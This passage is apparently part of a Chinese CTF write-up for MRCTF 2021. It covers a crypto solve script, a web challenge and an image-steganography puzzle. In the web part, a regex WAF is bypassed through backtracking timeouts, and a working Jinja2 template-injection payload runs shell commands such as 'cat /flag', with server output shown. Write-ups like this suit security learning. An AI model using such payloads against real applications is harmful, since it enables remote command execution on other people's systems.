+            <span class="token keyword">if</span> r <span class="token operator">!=</span> t<span class="token punctuation">:</span>
+                <span class="token comment"># print(r, t)</span>
+                <span class="token comment"># 一半正 一半负</span>
+                idx_result<span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>t<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># 正负号</span>
+                idx_result<span class="token punctuation">[</span>t<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>r<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
+                idx_list<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
+                idx_list<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>t<span class="token punctuation">)</span>
+                <span class="token keyword">break</span>
+    <span class="token keyword">return</span> idx_result
+
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    proof_of_work<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
+    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"question~"</span><span class="token punctuation">)</span>
+    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"N = "</span><span class="token punctuation">)</span>
+    tmp <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"]"</span><span class="token punctuation">)</span>
+    tmp <span class="token operator">=</span> tmp<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    tmp <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'===================='</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag len:"</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">8</span><span class="token punctuation">)</span>
+    <span class="token comment"># 28 bits</span>
+    N <span class="token operator">=</span> tmp
+    length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span>
+
+    idx_history <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    flag_bits <span class="token operator">=</span> <span class="token string">""</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        idx <span class="token operator">=</span> generate_idx<span class="token punctuation">(</span>length<span class="token punctuation">)</span>
+        <span class="token keyword">while</span> idx <span class="token keyword">in</span> idx_history<span class="token punctuation">:</span>
+            idx <span class="token operator">=</span> generate_idx<span class="token punctuation">(</span>length<span class="token punctuation">)</span>
+        idx_history<span class="token punctuation">.</span>append<span class="token punctuation">(</span>idx<span class="token punctuation">)</span>
+
+        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">try</span><span class="token punctuation">:</span>
+                t <span class="token operator">=</span> N<span class="token punctuation">[</span>idx<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">*</span> idx<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+            <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>
+                <span class="token keyword">raise</span> Exception
+            payload <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span>
+            sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+        sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'your gift: '</span><span class="token punctuation">)</span>
+        x <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"=======&gt; flag_</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">}</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">{</span>x<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        flag_bits <span class="token operator">+=</span> x
+
+        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">}</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">{</span>x<span class="token punctuation">}</span></span><span class="token string"> "</span></span><span class="token punctuation">)</span>
+            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>flag_bits<span class="token punctuation">}</span></span><span class="token string">\n"</span></span><span class="token punctuation">)</span>
+
+    <span class="token keyword">print</span><span class="token punctuation">(</span>flag_bits<span class="token punctuation">)</span>
+    <span class="token comment"># flag_bits = "1001101010100100100001101010100010001100111101101100101010000000011001101111001010111110110001101101000001100110110001101101011010111110011000101101110010111110111000001110010001100000110001001101100001100110110110101111101"</span>
+    flag_int <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>flag_bits<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
+    flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>flag_int<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=====&gt; flag:"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>最后得到的 flag bits 为</p>
+<pre class="language-none"><code class="language-none">1001101010100100100001101010100010001100111101101100101010000000011001101111001010111110110001101101000001100110110001101101011010111110011000101101110010111110111000001110010001100000110001001101100001100110110110101111101</code></pre>
+<p>转换为 bytes</p>
+<p><code>MRCTF{e@3y_ch3ck_1n_pr0bl3m}</code></p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="wwwafed-app"><a href="#wwwafed-app" class="headerlink" title="wwwafed_app"></a>wwwafed_app</h3><blockquote>
+<p>I bought a WAF for my vulnerable app, and I think it’s unbreakable now.</p>
+<p>node.mrctf.fun:15000</p>
+</blockquote>
+<p><code>/waf</code> 源码：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token punctuation">,</span>sys
+<span class="token keyword">import</span> timeout_decorator
+
+<span class="token decorator annotation punctuation">@timeout_decorator<span class="token punctuation">.</span>timeout</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token comment"># only xxx.yy-yy.zzz.mrctf.fun allow</span>
+	pat <span class="token operator">=</span> <span class="token string">r'^(([0-9a-z]|-)+|[0-9a-z]\.)+(mrctf\.fun)$'</span>
+	<span class="token keyword">if</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span>pat<span class="token punctuation">,</span>url<span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"BLOCK"</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token comment"># 拦截</span>
+	<span class="token keyword">else</span><span class="token punctuation">:</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"PASS"</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token comment"># 不拦截</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+	<span class="token keyword">try</span><span class="token punctuation">:</span>
+		waf<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+	<span class="token keyword">except</span><span class="token punctuation">:</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"PASS"</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre>
+<p>可以注意到如果超时了的话 <code>except</code> 里也是 PASS。</p>
+<p>另外发现 server 是 gunicorn，源码也是 python，盲猜是 flask 模板注入。</p>
+<p>发现貌似可以正则回溯超时+空行绕过。</p>
+<pre class="language-none"><code class="language-none">xadsfadsfadsfas.dfasdf-asdf-adsfadsf.lajds.-92341012dsfasf8.5.mrctf.fun
+{{161*1651}}
+
+eGFkc2ZhZHNmYWRzZmFzLmRmYXNkZi1hc2RmLWFkc2ZhZHNmLmxhamRzLi05MjM0MTAxMmRzZmFzZjguNS5tcmN0Zi5mdW4Ke3sxNjEqMTY1MX19
+
+GET /api/spider/eGFkc2ZhZHNmYWRzZmFzLmRmYXNkZi1hc2RmLWFkc2ZhZHNmLmxhamRzLi05MjM0MTAxMmRzZmFzZjguNS5tcmN0Zi5mdW4Ke3sxNjEqMTY1MX19</code></pre>
+<p>返回</p>
+<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210411200800302.png"></p>
+<p>读 <code>/</code></p>
+<pre class="language-none"><code class="language-none">{{""["\x5f\x5fcla""ss\x5f\x5f"]["\x5f\x5fba""se\x5f\x5f"]["\x5f\x5fsubcla""sses\x5f\x5f"]()[408]["\x5f\x5fin""it\x5f\x5f"]["\x5f\x5fglo""bals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("ls -al /")["read"]()}}
+
+http://node.mrctf.fun:15000/api/spider/eGFkc2ZhZHNmYWRzZmFzLmRmYXNkZi1hc2RmLWFkc2ZhZHNmLmxhamRzLi05MjM0MTAxMmRzZmFzZjguNS5tcmN0Zi5mdW4Ke3siIlsiXHg1Zlx4NWZjbGEiInNzXHg1Zlx4NWYiXVsiXHg1Zlx4NWZiYSIic2VceDVmXHg1ZiJdWyJceDVmXHg1ZnN1YmNsYSIic3Nlc1x4NWZceDVmIl0oKVs0MDhdWyJceDVmXHg1ZmluIiJpdFx4NWZceDVmIl1bIlx4NWZceDVmZ2xvIiJiYWxzXHg1Zlx4NWYiXVsiXHg1Zlx4NWZidWlsdGluc1x4NWZceDVmIl1bIlx4NWZceDVmaW1wb3J0XHg1Zlx4NWYiXSgib3MiKVsicG9wZW4iXSgibHMgLWFsIC8iKVsicmVhZCJdKCl9fQ==
+
+
+访问'xadsfadsfadsfas.dfasdf-asdf-adsfadsf.lajds.-92341012dsfasf8.5.mrctf.fun
+total 88
+drwxr-xr-x   1 root root 4096 Apr 11 11:55 .
+drwxr-xr-x   1 root root 4096 Apr 11 11:55 ..
+-rwxr-xr-x   1 root root    0 Apr 11 10:05 .dockerenv
+dr-xr-xr-x   1 root root 4096 Apr 11 10:05 app
+drwxr-xr-x   1 root root 4096 Mar 30 23:04 bin
+drwxr-xr-x   2 root root 4096 Mar 19 23:44 boot
+drwxr-xr-x   5 root root  340 Apr 11 10:05 dev
+drwxr-xr-x   1 root root 4096 Apr 11 10:05 etc
+-rw-r--r--   1 root root    2 Apr 11 11:55 flag
+drwxr-xr-x   2 root root 4096 Mar 19 23:44 home
+drwxr-xr-x   1 root root 4096 Mar 30 23:04 lib
+drwxr-xr-x   2 root root 4096 Mar 29 00:00 lib64
+drwxr-xr-x   2 root root 4096 Mar 29 00:00 media
+drwxr-xr-x   2 root root 4096 Mar 29 00:00 mnt
+drwxr-xr-x   2 root root 4096 Mar 29 00:00 opt
+dr-xr-xr-x 507 root root    0 Apr 11 10:05 proc
+drwx------   1 root root 4096 Apr 11 10:05 root
+drwxr-xr-x   3 root root 4096 Mar 29 00:00 run
+drwxr-xr-x   1 root root 4096 Mar 30 23:03 sbin
+drwxr-xr-x   2 root root 4096 Mar 29 00:00 srv
+dr-xr-xr-x  13 root root    0 Apr 11 10:05 sys
+drwxrwxrwt   1 root root 4096 Apr 11 10:05 tmp
+drwxr-xr-x   1 root root 4096 Mar 29 00:00 usr
+drwxr-xr-x   1 root root 4096 Mar 29 00:00 var
+'失败！</code></pre>
+<p>whoami ==&gt; root</p>
+<p>读 flag</p>
+<pre class="language-none"><code class="language-none">xadsfadsfadsfas.dfasdf-asdf-adsfadsf.lajds.-92341012dsfasf8.5.mrctf.fun
+{{""["\x5f\x5fcla""ss\x5f\x5f"]["\x5f\x5fba""se\x5f\x5f"]["\x5f\x5fsubcla""sses\x5f\x5f"]()[408]["\x5f\x5fin""it\x5f\x5f"]["\x5f\x5fglo""bals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("cat /flag")["read"]()}}</code></pre>
+<p><code>MRCTF{eeeeeeeeeeeeeeeeeeeeez_NFA-WAF_8ypaS5!}</code></p>
+<p>读一下题目源码 <code>start.py</code></p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>url_for
+<span class="token keyword">from</span> jinja2 <span class="token keyword">import</span> Template
+<span class="token keyword">import</span> requests<span class="token punctuation">,</span>base64<span class="token punctuation">,</span>shlex<span class="token punctuation">,</span>os
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/waf"</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">wafsource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"waf.py"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/source"</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">appsource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/api/spider/&lt;url&gt;"</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">spider</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	url <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
+	safeurl <span class="token operator">=</span> shlex<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+	block <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"python3 waf.py "</span> <span class="token operator">+</span> safeurl<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+	<span class="token keyword">if</span> block <span class="token operator">==</span> <span class="token string">"PASS"</span><span class="token punctuation">:</span>
+		<span class="token keyword">try</span><span class="token punctuation">:</span>
+			req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://"</span><span class="token operator">+</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
+			<span class="token keyword">return</span> Template<span class="token punctuation">(</span><span class="token string">"访问成功!网页返回了{}字节数据"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		<span class="token keyword">except</span><span class="token punctuation">:</span>
+			<span class="token keyword">return</span> Template<span class="token punctuation">(</span><span class="token string">"访问{}失败！"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>safeurl<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token punctuation">)</span>
+	<span class="token keyword">else</span><span class="token punctuation">:</span>
+		<span class="token keyword">return</span> Template<span class="token punctuation">(</span><span class="token string">"WAF已拦截，请不要乱输入参数！"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+	app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>
+<p>啊 有 <code>/source</code> 源码泄露的啊（（下次做题先扫一扫好了</p>
+<blockquote>
+<p>讲个笑话，这题打的时候最开始还读到有 flag 的，然后发现内容是 <code>1</code>。</p>
+<p>再一读发现没东西了。再一看根目录，flag 你去哪了……</p>
+<p>问了问出题人</p>
+<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210411213829805.png"></p>
+<p>噢对，root 权限 xswl！</p>
+</blockquote>
+<blockquote>
+<p><strong>Extensive Reading:</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
+</blockquote>
+<h3 id="ez-larave1"><a href="#ez-larave1" class="headerlink" title="ez_larave1"></a>ez_larave1</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="http://node.mrctf.fun:10012/">http://node.mrctf.fun:10012/</a></p>
+<p><a target="_blank" rel="noopener" href="https://drive.buptmerak.cn/s/afGBmP8zjg47orG">https://drive.buptmerak.cn/s/afGBmP8zjg47orG</a></p>
+</blockquote>
+<p>根据修改时间，看一看最近修改的文件。</p>
+<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210411024331176.png"></p>
+<p>Laravel 版本用的是 5.7.29，查了查发现有个 RCE。</p>
+<p>然后这里的 <code>PendingCommand.php</code> 把 <code>__destruct()</code> 里的 <code>run</code> 给注释掉了。</p>
+<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210414231340203.png" alt="__destruct"></p>
+<p>之后再参考下面的几篇</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5510">Laravel入坑之CVE-2019-9081复现分析</a></p>
+<p><a target="_blank" rel="noopener" href="http://zeroyu.xyz/2020/06/28/Laravel-5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2019-9081-2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E9%A2%98%E8%A7%A3/">Laravel 5.7反序列化漏洞(CVE-2019-9081+2020第五空间题解)</a>   </p>
+</blockquote>
+<p>找个能执行代码的地方，执行这个 <code>run</code> 就好。</p>
+<p><em>（后面再来复现，咕咕咕</em></p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="plane"><a href="#plane" class="headerlink" title="plane"></a>plane</h3><blockquote>
+<p>This plane cannot fly~~~</p>
+<h3 id="Hint"><a href="#Hint" class="headerlink" title="Hint:"></a>Hint:</h3><ul>
+<li>plane:721x-402y+9110z-1197483=0</li>
+</ul>
+</blockquote>
+<p>![(153, 15, 120),(51, 104, 132),(229, 38, 115)](CTF_2021MRCTF/(153, 15, 120),(51, 104, 132),(229, 38, 115).png)</p>
+<p>图片好花啊，看了一下发现在 blue plane 第7层存在奇怪的东西。</p>
+<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210414233015328.png"></p>
+<p>然而提取出来啥也看不出。</p>
+<p>根据题目 hint，估计是要根据 721x-402y+9110z-1197483=0 这个空间平面来划分图像空间，一半是黑，一半是白。</p>
+<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210414233411199.png" alt="721x-402y+9110z-1197483=0"></p>
+<p>按照题目本意的话，应该是需要根据 (153, 15, 120), (51, 104, 132), (229, 38, 115) 这三个坐标来求出所给的平面的，不过即使给出来了当时还是没整出来（（</p>
+<p>写个脚本。</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding: utf-8</span>
+<span class="token triple-quoted-string string">"""
+MRCTF2021 Misc plane
+MiaoTony
+"""</span>
+
+<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image
+
+
+im <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'(153, 15, 120),(51, 104, 132),(229, 38, 115).png'</span><span class="token punctuation">)</span>
+rgb_im <span class="token operator">=</span> im<span class="token punctuation">.</span>convert<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>rgb_im<span class="token punctuation">.</span>size<span class="token punctuation">)</span>
+<span class="token comment"># (400, 400)</span>
+width <span class="token operator">=</span> rgb_im<span class="token punctuation">.</span>width
+height <span class="token operator">=</span> rgb_im<span class="token punctuation">.</span>height
+
+im2 <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> rgb_im<span class="token punctuation">.</span>size<span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        r<span class="token punctuation">,</span> g<span class="token punctuation">,</span> b <span class="token operator">=</span> rgb_im<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token number">721</span><span class="token operator">*</span>r<span class="token operator">-</span><span class="token number">402</span><span class="token operator">*</span>g<span class="token operator">+</span><span class="token number">9110</span><span class="token operator">*</span>b<span class="token operator">-</span><span class="token number">1197483</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
+            im2<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment"># im2.show()</span>
+<span class="token comment"># im2.save('test1.png')</span></code></pre>
+<p>得到一张图片，和  blue plane 7 很类似。（就是模仿 blue plane 7 确定的黑白）</p>
+<p><img src="/2021/04/15/CTF_2021MRCTF/test1.png"></p>
+<p>放大来看是这样的。</p>
+<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210418002111188.png" alt="放大效果"></p>
+<p>图片 <strong>纵向方向上</strong> 可以发现分了很多层，猜想是把二进制的 ASCII 编码到了黑白像素中了。</p>
+<p>根据最右边纵向可以估计是 10000110，不对，反过来，01100001，正好是 ASCII 里的 <code>a</code>。于是需要上下反过来解码。</p>
+<p>而且还是从上到下，一列有50个字符，每个字符从上到下是低位到高位。</p>
+<p>（复现的时候其实这里试了好多次才发现的……</p>
+<p>然后写个脚本解码吧。（接上面的）</p>
+<pre class="language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> <span class="token string">''</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    cnt <span class="token operator">=</span> <span class="token number">0</span>
+    x <span class="token operator">=</span> <span class="token string">''</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> im2<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+            x <span class="token operator">=</span> <span class="token string">'1'</span> <span class="token operator">+</span> x
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            x <span class="token operator">=</span> <span class="token string">'0'</span> <span class="token operator">+</span> x
+        cnt <span class="token operator">+=</span> <span class="token number">1</span>
+        <span class="token keyword">if</span> cnt <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+            <span class="token comment"># print(x)</span>
+            ch <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token comment"># print(ch)</span>
+            data <span class="token operator">+=</span> ch
+            x <span class="token operator">=</span> <span class="token string">''</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'result.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span></code></pre>
+<p>处理得到</p>
